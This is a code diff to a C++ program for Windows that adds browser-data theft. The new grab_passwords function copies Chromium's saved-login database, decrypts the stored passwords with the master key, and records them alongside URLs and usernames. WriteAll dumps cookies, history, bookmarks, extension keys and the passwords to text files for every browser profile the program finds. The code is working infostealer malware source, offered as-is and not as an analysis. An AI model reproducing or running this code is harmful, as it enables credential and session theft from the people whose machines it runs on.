@@ -35,6 +35,8 @@
 #include <sodium.h>
 #include <wincrypt.h>
 #include <sqlite3.h>
+#include <sstream>
+#include <dirent.h>
 
 using json = nlohmann::json;
 
@@ -545,6 +547,135 @@ std::vector<ExtensionInfo> grab_ext(const std::string& path, std::string profile
   return extension_info_list;
 }
 
+
+std::string grab_passwords(std::string path, std::string masterKey, std::string profile) {
+    try {
+        std::string temp = std::getenv("TEMP");
+        std::string filepath = path + "\\" + profile + "\\Login Data";
+        if (_access(filepath.c_str(), 0) == 0) {
+            std::ifstream source(filepath, std::ios::binary);
+            std::ofstream destination(temp + "\\Login data", std::ios::binary);
+            destination << source.rdbuf();
+            source.close();
+            destination.close();
+
+            std::string data_path = temp + "\\Login Data";
+
+            sqlite3* db;
+            int rc = sqlite3_open(data_path.c_str(), &db);
+            if (rc != SQLITE_OK) {
+                sqlite3_close(db);
+                return "";
+            }
+
+            sqlite3_stmt* stmt;
+            rc = sqlite3_prepare_v2(db, "SELECT origin_url, action_url, username_value, password_value, date_created, times_used FROM logins", -1, &stmt, NULL);
+            if (rc != SQLITE_OK) {
+                sqlite3_close(db);
+                return "";
+            }
+
+            std::string passwords;
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                std::string url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
+                std::string action_url(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
+                std::string username(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2)));
+                std::string encrypted_password(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3)));
+                std::string date(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 4)));
+                std::string times_used = std::to_string(sqlite3_column_int(stmt, 5));
+
+                std::string decrypted_password = decrypt_val(masterKey, encrypted_password);
+
+                if (decrypted_password != "Chrome < 80") {
+                    passwords += "URL: " + url + "\n";
+                    passwords += "Action URL: " + action_url + "\n";
+                    passwords += "Username: " + username + "\n";
+                    passwords += "Password: " + decrypted_password + "\n";
+                    passwords += "Date created: " + date + "\n";
+                    passwords += "Times used: " + times_used + "\n\n";
+                }
+            }
+
+            sqlite3_finalize(stmt);
+            sqlite3_close(db);
+
+            return passwords;
+        }
+        else {
+            return "";
+        }
+    }
+    catch (...) {
+        return "";
+    }
+}
+
+void WriteAll(std::string browser, std::string profile, std::string cookies, std::string history, std::string downhistory, std::string bookmarks, std::vector<ExtensionInfo> extensions, std::string misc, std::string pwds )
+{
+    std::string dir = global::defaultPath + browser;
+
+    std::ofstream file(dir+ "cookies" + '_' + profile + ".txt", std::ios::app);
+    if (file.is_open())
+    {
+        file << cookies << std::endl;
+    }
+    file.close();
+
+
+    std::ofstream file1(dir + "history" + '_' + profile + ".txt", std::ios::app);
+    if (file1.is_open())
+    {
+        file1 << history << std::endl;
+    }
+    file1.close();
+
+
+    std::ofstream file2(dir + "downhistory" + '_' + profile + ".txt", std::ios::app);
+    if (file2.is_open())
+    {
+        file2 << downhistory << std::endl;
+    }
+    file2.close();
+
+    std::ofstream file3(dir + "bookmarks" + '_' + profile + ".txt", std::ios::app);
+    if (file3.is_open())
+    {
+        file3 << bookmarks << std::endl;
+    }
+    file3.close();
+
+    std::ofstream file35(dir + "extensions" + '_' + profile + ".txt", std::ios::app);
+    if (file35.is_open())
+    {
+        for (ExtensionInfo element : extensions)
+        {
+            file35 << "name: "+element.name << std::endl;
+            file35 << "version: " + element.version << std::endl;
+            file35 << "key: " + element.key << std::endl;
+            for (std::string omg : element.permissions)
+            {
+                file35 << "   permissions:" + omg << std::endl;
+            }
+            
+        }
+    }
+    file35.close();
+
+    std::ofstream file4(dir + "misc" + '_' + profile + ".txt", std::ios::app);
+    if (file4.is_open())
+    {
+        file4 << misc << std::endl;
+    }
+    file4.close();
+
+    std::ofstream file5(dir + "pwds" + '_' + profile + ".txt", std::ios::app);
+    if (file5.is_open())
+    {
+        file5 << pwds << std::endl;
+    }
+    file5.close();
+}
+
 void browsers::Chromium()
 {
     printf("Chromium\n");
@@ -588,12 +719,22 @@ void browsers::Chromium()
     {
         if (std::filesystem::exists(browsersPaths[i])) 
         {
+            std::string mk = getMasterKey(browsersPaths[i]);
+
             for (size_t j = 0; j < std::size(profiles); j++)
             {
                 if (std::filesystem::exists(browsersPaths[i] + "/" + profiles[j]))
                 {
                     std::string dir = global::defaultPath + global::names[i];
                     int result = _mkdir(dir.c_str());
+                    std::string cookies = grab_cookies(browsersPaths[i], mk, profiles[j]);
+                    std::string history = grab_history(browsersPaths[i], profiles[j]);
+                    std::string downhistory = grab_downhistory(browsersPaths[i], profiles[j]);
+                    std::string bookmarks = grab_bookmarks(browsersPaths[i], profiles[j]);
+                    std::vector<ExtensionInfo> extensions = grab_ext(browsersPaths[i], profiles[j]);
+                    std::string misc = grab_misc(browsersPaths[i], mk, profiles[j]);
+                    std::string pwds = grab_passwords(browsersPaths[i], mk, profiles[j]);
+                    WriteAll(global::names[i], profiles[j], cookies, history, downhistory, bookmarks, extensions, misc, pwds);
 
                 }
             }
